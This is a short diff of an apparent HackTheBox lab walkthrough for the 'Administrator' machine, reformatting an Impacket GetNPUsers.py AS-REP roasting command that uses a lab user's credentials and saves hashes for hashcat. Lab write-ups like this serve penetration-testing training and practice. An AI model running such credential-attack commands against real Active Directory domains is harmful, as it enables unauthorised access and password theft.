@@ -218,7 +218,11 @@ ldapsearch -x -LLL -H ldap://10.10.11.42:389 -b "CN=users,DC=administrator,DC=ht
 
 Now that we have olivia's creds we can confirm that there's no asrep roastable users
 ```bash
-GetNPUsers.py administrator.htb/olivia:ichliebedich -request -format hashcat -outputfile hashes.asreproast
+GetNPUsers.py \
+  administrator.htb/olivia:ichliebedich \
+  -request \
+  -format hashcat \
+  -outputfile hashes.asreproast
 ```
 
 ## BloodHound
